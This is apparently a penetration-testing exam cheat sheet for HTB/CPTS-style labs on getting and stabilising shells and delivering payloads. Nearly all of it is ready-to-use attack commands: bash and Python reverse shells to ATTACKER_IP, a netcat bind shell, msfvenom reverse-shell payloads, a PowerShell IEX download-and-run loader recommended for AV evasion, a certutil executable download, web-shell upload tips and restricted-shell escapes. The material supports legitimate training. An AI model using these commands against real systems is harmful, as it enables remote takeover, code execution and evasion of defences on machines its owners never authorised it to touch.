## Core Mental Model

Before choosing any shell or payload, classify the situation:

**1. Inbound or outbound control?**

* Outbound allowed → Reverse shell (preferred)
* Inbound allowed → Bind shell (rare)

**2. How restricted is execution?**

* Full command execution → direct shells
* Limited / web upload → web shells
* No execution → fileless / LOLBIN / encoding

**3. What tools exist on target?**

* Windows → PowerShell, certutil, bitsadmin
* Linux → bash, python, perl, netcat

---

# Shell Types

## Reverse Shell (MOST IMPORTANT)

Attacker listens, victim connects.

### Why it’s preferred:

* Works through NAT/firewalls
* Most realistic in HTB/CPTS

```bash
# attacker
nc -lvnp 443
```

### Simple payload examples:

**Linux**

```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

**Python**

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

---

## Bind Shell (RARE)

Victim listens, attacker connects.

```bash
# victim
nc -lvnp 7777 -e /bin/bash

# attacker
nc victim_ip 7777
```

### When it works:

* Internal networks
* No outbound access

---

# Shell Stabilisation (IMPORTANT IN EXAMS)

Once you get a shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
CTRL + Z
stty raw -echo; fg
```

---

# Payload Generation (MSFVENOM)

## Staged vs Non-Staged

| Type           | Meaning                     |
| -------------- | --------------------------- |
| staged `/`     | small loader + second stage |
| non-staged `_` | full payload at once        |

---

## Linux payload

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f elf > shell.elf
chmod +x shell.elf
```

## Windows payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -f exe > shell.exe
```

---

# Web Shells

## PHP Shell

* Best for file upload vulnerabilities

Workflow:

1. Upload `.php`
2. Access via browser
3. Execute commands

If blocked:

* change content-type (Burp)

---

## ASPX Shell (Windows)

Used in IIS environments.

Example:

* Antak (Nishang framework)

---

# Interactive Shell Conversion

## Linux

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
/bin/sh -i
```

## Others

```bash
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh";'
awk 'BEGIN {system("/bin/sh")}'
vim -c ':!/bin/sh'
```

---

# Fileless Execution (HIGH VALUE)

## PowerShell IEX

```powershell
IEX(New-Object Net.WebClient).DownloadString("URL")
```

### Use when:

* no disk writes allowed
* AV evasion needed
* HTB “memory execution” scenarios

---

# Payload Delivery Methods

## HTTP (DEFAULT)

```bash
python3 -m http.server 80
```

## SMB

```bash
impacket-smbserver share /tmp
```

## FTP

```bash
python3 -m pyftpdlib --port 21
```

## Base64 (NO NETWORK)

* small files only
* restricted shells

---

# Fileless vs File-Based Decision

| Situation           | Method         |
| ------------------- | -------------- |
| normal access       | HTTP download  |
| restricted network  | SMB / FTP      |
| no outbound traffic | Base64         |
| AV likely           | IEX / fileless |
| upload only         | web shell      |

---

# LOLBINS (Windows Survival Kit)

* certutil
* bitsadmin
* PowerShell WebClient
* mshta
* rundll32

Example:

```bash
certutil -urlcache -f http://IP/file.exe file.exe
```

---

# Linux Shell Escape Techniques

If stuck in restricted shell:

* python pty
* vim escape
* awk / find
* perl exec

---

# Exam Priority Order (IMPORTANT)

If you forget everything:

1. Reverse shell (nc / bash / python)
2. Web shell (if upload exists)
3. PowerShell IEX (Windows)
4. HTTP download (wget/curl)
5. SMB / FTP fallback
6. Base64 last resort

---

